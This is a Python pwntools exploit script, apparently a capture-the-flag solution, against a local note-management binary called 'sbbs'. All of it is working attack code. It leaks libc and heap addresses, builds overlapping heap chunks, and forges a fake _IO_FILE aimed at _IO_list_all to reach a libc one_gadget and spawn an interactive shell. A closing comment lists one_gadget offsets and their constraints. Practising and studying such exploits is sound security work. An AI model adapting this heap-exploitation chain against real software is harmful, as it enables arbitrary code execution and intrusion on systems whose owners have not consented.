from pwn import *

p=process('./sbbs')
elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')

_IO_list_all=elf.symbols['_IO_list_all']
#one_gadget=0x45216
#one_gadget=0x4526A
#one_gadget=0xf02a4
one_gadget=0xf1147

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='4.exit\n'

def add(size,content=''):
    sla(menu,'1')
    sla('Pls Input your note size\n',str(size))
    sla('Input your note\n',content)


def dele(index):
    sla(menu,'2')
    sla('Input id:\n',str(index))

def login(name):
    sla(menu,'3')
    sla('Please input your name\n',name)
    sla('1.admin\n','0')




add(0x1000)     # 0
add(0x100)      # 1
add(0x15f0)     # 2
dele(0)


add(0x400)
rv('your note is\n')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c5198
log.info('libc base is:'+hex(libc_base))

dele(0)
add(0x400,'a'*17)
rv('a'*16)
chunk_base=u64(p.recv(4)+4*'\x00')-0x61
log.info('chunk base is:'+hex(chunk_base))

dele(0)
dele(1)
dele(2)

# clear heap
##########################################


add(0x200)      # 0
add(0x100)      # 1

for i in range(6):
    add(0x15f0)  # 2->7

dele(6)
dele(1)
login('a'*8+p64(chunk_base+0x211-8))

add(0x15f0,'a'*0xc48+p64(0x6568)) # 1
dele(7)

add(0x200)  # 6


add(0x15f0,'a'*0x100)   # 7 overlap with 2
add(0x15f0,'a'*0x100)   # 8 overlap with 3
add(0x15f0,'a'*0x100)   # 9

dele(3)
dele(8)

payload='b'*0xf8
payload+=p64(0x61)
payload+=p64(0)+p64(_IO_list_all+libc_base-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*21+p64(chunk_base+0x1b00)
payload+=p64(0)*3+p64(one_gadget+libc_base)

#gdb.attach(p,gdbscript='b _IO_flush_all_lockp\nc')
add(0x15f0,payload)   # 3

sla(menu,'1')
sla('Pls Input your note size\n',str(0x16f0))
 

p.interactive()

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
